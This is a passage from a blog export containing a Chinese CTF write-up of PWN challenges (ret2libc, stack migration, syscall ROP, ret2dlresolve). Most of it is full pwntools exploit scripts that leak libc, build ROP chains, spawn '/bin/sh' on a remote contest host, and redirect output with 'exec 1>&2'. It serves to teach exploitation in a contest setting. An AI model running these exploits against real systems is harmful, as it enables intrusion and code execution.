p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\np=remote('8.130.110.158',2110)\n \nfunc_addr=elf.got['write']\nwrite_addr=elf.plt['write']\n \npop_rdi=0x4012a3\npop_rsi2=0x4012a1\nret=0x40101a\nvuln=0x4011db\n \npayload= b'a'*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadbeef)+p64(write_addr)+p64(vuln)\np.sendlineafter('voice :',payload)\np.recv()\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['write']\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\n \npause()\npayload=b'a'*0x10+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)\np.sendlineafter('voice :',payload)\n \np.interactive()\n \n# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x00000000004012a0 : pop r14 ; pop r15 ; ret\n# 0x00000000004012a2 : pop r15 ; ret\n# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x000000000040115d : pop rbp ; ret\n# 0x00000000004012a3 : pop rdi ; ret\n# 0x00000000004012a1 : pop rsi ; pop r15 ; ret\n# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n```\n### Stack_Migration\n字面意思，栈可以到处跑\n正常审题程序不再罗列（checksec、IDA看字符串啥的）。\nIDA中发现有沙箱\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png)\n依旧是发现栈溢出。\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png)\n考虑到没法直接执行shellcode，因此只能构建ROP链。实现以下功能：\n```\nchar*file='flag';\nopen(file,0,0);\nread(3,file,0x30);\nwrite(1,file,0x30);\n```\n这里把存储flag文件的名称和栈迁移之后的ROP链一起读入到bss那里。毕竟空间充足。\n```\nfrom pwn import*\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\np=remote('8.130.110.158',2109)\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\n \nbss_st=0x4040A0\nbss_tar=0x4040A0+0x200\nflag_name=0x4040a0+0x200-8\nflag_addr=bss_st+0x300-0x40\n \npop_rdi=0x401373\npop_rsi2=0x401371\nleave=0x4012e6\n \nfunc_addr=elf.got['read']\nwrite_addr=elf.plt['write']\nread_addr=elf.plt['read']\nvuln=0x401279\n \npayload1=b'a'*(0x200-0x8)+b'flag\\x00\\x00\\x00\\x00'+p64(bss_tar+0x100)+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(write_addr)+p64(0x4012a3)\np.sendlineafter('everywhere',payload1)\n \nmigr_pay=b'a'*0x8+p64(bss_tar)+p64(leave)\np.sendafter('voice :',migr_pay)\np.recv()\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['read']\nprint(hex(base))\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\nopen64_addr=base+libc.symbols['open64']\n \npop_rdx=0x142c92+base\npop_rsi=0x2601f+base\npause()\npayload2=p64(bss_st+0x100)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(open64_addr)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(read_addr)\npayload2+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(write_addr)+p64(vuln)\np.sendline(payload2)\n \nmigr_pay=b'a'*0x8+p64(bss_st)+p64(leave)\np.sendafter('voice :',migr_pay)\n \np.interactive()\n \n# 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401370 : pop r14 ; pop r15 ; ret\n# 0x0000000000401372 : pop r15 ; ret\n# 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x00000000004011bd : pop rbp ; ret\n# 0x0000000000401373 : pop rdi ; ret\n# 0x0000000000401371 : pop rsi ; pop r15 ; ret\n# 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n# 0x000000000040121a : ret 0xfffe\n \n# in libc\n# 0x0000000000142c92 : pop rdx ; ret\n# 0x000000000002601f : pop rsi ; ret\n```\n### call me sys\nsyscall，但是只能用几个函数\n又是沙箱：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png)\n还是栈溢出漏洞：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png)\n由于没有关掉open,write,read函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）\n```\nfrom pwn import*\n \ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\np=remote('8.130.110.158',2111)\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\nfunc_addr=elf.got['setvbuf']\nsyscall_ret=0x4012ec\npop_rdi=0x401363\npop_rsi2=0x401361\n \np.sendline(\"000\")\npayload=b'a'*0x78+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(0x401291)\npause()\np.sendline(payload)\np.recvuntil(b'./f1ag')\np.recv(2)\n# p.recvuntil(b'./f1ag\\x00\\x00\\x00')\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['setvbuf']\nprint(hex(func_addr))\nprint(hex(base))\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\nopen64_addr=base+libc.symbols['open64']\n \nflag_name=0x4040e0\npop_rdx=0x142c92+base\npop_rsi=0x2601f+base\npop_rax=0x36174+base\n \npayload=b'flag\\x00\\x00\\x00\\x00'\npause()\np.send(payload)\n \npayload=b'a'*0x78+p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rsi)+p64(0)+p64(syscall_ret)+p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(0x401270)\npause()\np.send(payload)\n \np.interactive(0)\n \n# 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401360 : pop r14 ; pop r15 ; ret\n# 0x0000000000401362 : pop r15 ; ret\n# 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x000000000040119d : pop rbp ; ret\n# 0x0000000000401363 : pop rdi ; ret\n# 0x0000000000401361 : pop rsi ; pop r15 ; ret\n# 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n# 0x000000000040127e : ret 0x14\n# 0x00000000004012e7 : ret 0x200\n \n# 0x00000000004012ba : ret 0x4c\n# 0x000000000040129c : ret 0x50\n# offset in libc\n# 0x0000000000036174 : pop rax ; ret\n```\n\n### close\nQ:你leak不了一点！hacker！！\nA:？？？？？？\n依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得flag\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png)\n既然我们在get shell之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。\n于是毋庸置疑，关于泄露libc地址的方法直接一票否决了。\n于是考虑使用ret2dlresolve来调用shell。\n这里使用生成的payload\n原本是想用system(\"/bin/sh\")的，但是发现system好像有些神秘问题导致显示：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png)\n于是采用execve(\"/bin/sh\",0,0)来获取shell\n但是由于没有直接pop rdx的gadget，我们使用csu来进行rdx的修改。（注意这里面的call和判断,标记起来了）：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png)\n所以我们先把想要的rdx的值pop到r14里面，然后返回到0x4012300那里，把r14赋给rdx。这里绕过判断就是让rbx和rbp值相等。这里多调试几下就OK了\n之后就get到shell了。这时候我们要把标准输出重定向到标准错误里面，即exec 1>&2\nhint:网上关于标准输出被关闭的情况，有教程：exec 1>&0。但是似乎ubuntu 20不太好使。 可以选择把输出重定向给标准错误（2）\n```\nfrom pwn import *\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\ncontext.binary = elf = ELF(\"./pwn\")\nrop = ROP(context.binary)\ndlresolve = Ret2dlresolvePayload(elf,symbol=\"execve\",args=[\"/bin/sh\",0])\nrop.read(0,dlresolve.data_addr)\nrop.ret2dlresolve(dlresolve)\nraw_rop = rop.chain()\n# io = process(\"./pwn\")\n# io=process(['./ld-linux-x86-64.so.2', './pwn'], env={\"LD_PRELOAD\":'./libc.so.6'})\n# io=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\nio=remote('8.130.110.158',7001)\n# gdb.attach(io)\npayload0 = flat({0x98:raw_rop})\nio.sendlineafter('name',\"fuck\")\npayload1=b'a'*0x90+p64(0x404e90)+p64(0x40127c)\nio.sendlineafter('response',payload1)\npause()\nio.sendline(dlresolve.payload.ljust(0x90,b'\\x00')+p64(0x404ff0)+p64(0x401323)+p64(0x402018)+p64(0x40131a)+p64(0)+p64(1)+p64(0x402018)+p64(0)+p64(0)+p64(elf.got['alarm'])+p64(0x401300)+p64(0x404e90)+p64(0x404ff0)+p64(0x401230)+p64(0)+p64(0)+p64(0)+raw_rop[40:])\n# pause()\n# io.sendline(dlresolve.payload)\n# io=remote('8.130.110.158',7001)\nio.sendline(b\"exec 1>&2\")\nio.sendline(b\"ls\")\nio.interactive()\n \n# 0x404e90\n# 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401320 : pop r14 ; pop r15 ; ret\n# 0x0000000000401322 : pop r15 ; ret\n# 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x00000000004011bd : pop rbp ; ret\n# 0x0000000000401323 : pop rdi ; ret\n# 0x0000000000401321 : pop rsi ; pop r15 ; ret\n# 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n```\n","slug":"NEUQCSA-10月月赛题解","published":1,"date":"2023-11-04T07:04:58.363Z","updated":"2023-11-04T07:06:21.482Z","comments":1,"layout":"post","photos":[],"_id":"clojpbdic0000z0aied7jc2c5","content":"<p>markdown出问题的话直接看链接：<a href=\"https://zcoi.github.io/blogs/CTF/monthgame2310/\">https://zcoi.github.io/blogs/CTF/monthgame2310/</a></p>\n<h1 id=\"解题情况\"><a href=\"#解题情况\" class=\"headerlink\" title=\"解题情况\"></a>解题情况</h1><p><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/web.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png\"></p>\n<h1 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h1><h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"level1-Login\"><a href=\"#level1-Login\" class=\"headerlink\" title=\"level1-Login\"></a>level1-Login</h3><p>直接看html，发现base64加密的一串。直接解密就是flag</p>\n<h2 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h2><h3 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h3><p>Q:请嗯造libc<br>A:我嗯造libc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class=\"line\"># p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class=\"line\"># gdb.attach(p)</span><br><span class=\"line\">p=remote(&#x27;8.130.110.158&#x27;,2110)</span><br><span class=\"line\"> </span><br><span class=\"line\">func_addr=elf.got[&#x27;write&#x27;]</span><br><span class=\"line\">write_addr=elf.plt[&#x27;write&#x27;]</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdi=0x4012a3</span><br><span class=\"line\">pop_rsi2=0x4012a1</span><br><span class=\"line\">ret=0x40101a</span><br><span class=\"line\">vuln=0x4011db</span><br><span class=\"line\"> </span><br><span class=\"line\">payload= b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadbeef)+p64(write_addr)+p64(vuln)</span><br><span class=\"line\">p.sendlineafter(&#x27;voice :&#x27;,payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">func_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">base=func_addr-libc.symbols[&#x27;write&#x27;]</span><br><span class=\"line\">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class=\"line\">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\"> </span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)</span><br><span class=\"line\">p.sendlineafter(&#x27;voice :&#x27;,payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x00000000004012a0 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x00000000004012a2 : pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040115d : pop rbp ; ret</span><br><span class=\"line\"># 0x00000000004012a3 : pop rdi ; ret</span><br><span class=\"line\"># 0x00000000004012a1 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040101a : ret</span><br></pre></td></tr></table></figure>\n<h3 id=\"Stack-Migration\"><a href=\"#Stack-Migration\" class=\"headerlink\" title=\"Stack_Migration\"></a>Stack_Migration</h3><p>字面意思，栈可以到处跑<br>正常审题程序不再罗列（checksec、IDA看字符串啥的）。<br>IDA中发现有沙箱<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png\"><br>依旧是发现栈溢出。<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png\"><br>考虑到没法直接执行shellcode，因此只能构建ROP链。实现以下功能：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char*file=&#x27;flag&#x27;;</span><br><span class=\"line\">open(file,0,0);</span><br><span class=\"line\">read(3,file,0x30);</span><br><span class=\"line\">write(1,file,0x30);</span><br></pre></td></tr></table></figure>\n<p>这里把存储flag文件的名称和栈迁移之后的ROP链一起读入到bss那里。毕竟空间充足。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class=\"line\">p=remote(&#x27;8.130.110.158&#x27;,2109)</span><br><span class=\"line\"># p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class=\"line\"># gdb.attach(p)</span><br><span class=\"line\"> </span><br><span class=\"line\">bss_st=0x4040A0</span><br><span class=\"line\">bss_tar=0x4040A0+0x200</span><br><span class=\"line\">flag_name=0x4040a0+0x200-8</span><br><span class=\"line\">flag_addr=bss_st+0x300-0x40</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdi=0x401373</span><br><span class=\"line\">pop_rsi2=0x401371</span><br><span class=\"line\">leave=0x4012e6</span><br><span class=\"line\"> </span><br><span class=\"line\">func_addr=elf.got[&#x27;read&#x27;]</span><br><span class=\"line\">write_addr=elf.plt[&#x27;write&#x27;]</span><br><span class=\"line\">read_addr=elf.plt[&#x27;read&#x27;]</span><br><span class=\"line\">vuln=0x401279</span><br><span class=\"line\"> </span><br><span class=\"line\">payload1=b&#x27;a&#x27;*(0x200-0x8)+b&#x27;flag\\x00\\x00\\x00\\x00&#x27;+p64(bss_tar+0x100)+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(write_addr)+p64(0x4012a3)</span><br><span class=\"line\">p.sendlineafter(&#x27;everywhere&#x27;,payload1)</span><br><span class=\"line\"> </span><br><span class=\"line\">migr_pay=b&#x27;a&#x27;*0x8+p64(bss_tar)+p64(leave)</span><br><span class=\"line\">p.sendafter(&#x27;voice :&#x27;,migr_pay)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">func_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">base=func_addr-libc.symbols[&#x27;read&#x27;]</span><br><span class=\"line\">print(hex(base))</span><br><span class=\"line\">system_addr=base+libc.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">printf_addr=base+libc.symbols[&#x27;printf&#x27;]</span><br><span class=\"line\">sh=base+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">open64_addr=base+libc.symbols[&#x27;open64&#x27;]</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdx=0x142c92+base</span><br><span class=\"line\">pop_rsi=0x2601f+base</span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload2=p64(bss_st+0x100)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(open64_addr)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(read_addr)</span><br><span class=\"line\">payload2+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(write_addr)+p64(vuln)</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\"> </span><br><span class=\"line\">migr_pay=b&#x27;a&#x27;*0x8+p64(bss_st)+p64(leave)</span><br><span class=\"line\">p.sendafter(&#x27;voice :&#x27;,migr_pay)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401370 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401372 : pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x00000000004011bd : pop rbp ; ret</span><br><span class=\"line\"># 0x0000000000401373 : pop rdi ; ret</span><br><span class=\"line\"># 0x0000000000401371 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040101a : ret</span><br><span class=\"line\"># 0x000000000040121a : ret 0xfffe</span><br><span class=\"line\"> </span><br><span class=\"line\"># in libc</span><br><span class=\"line\"># 0x0000000000142c92 : pop rdx ; ret</span><br><span class=\"line\"># 0x000000000002601f : pop rsi ; ret</span><br></pre></td></tr></table></figure>\n<h3 id=\"call-me-sys\"><a href=\"#call-me-sys\" class=\"headerlink\" title=\"call me sys\"></a>call me sys</h3><p>syscall，但是只能用几个函数<br>又是沙箱：<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png\"><br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png\"><br>还是栈溢出漏洞：<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png\"><br>由于没有关掉open,write,read函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\"> </span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">libc=ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class=\"line\">p=remote(&#x27;8.130.110.158&#x27;,2111)</span><br><span class=\"line\"># p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class=\"line\"># 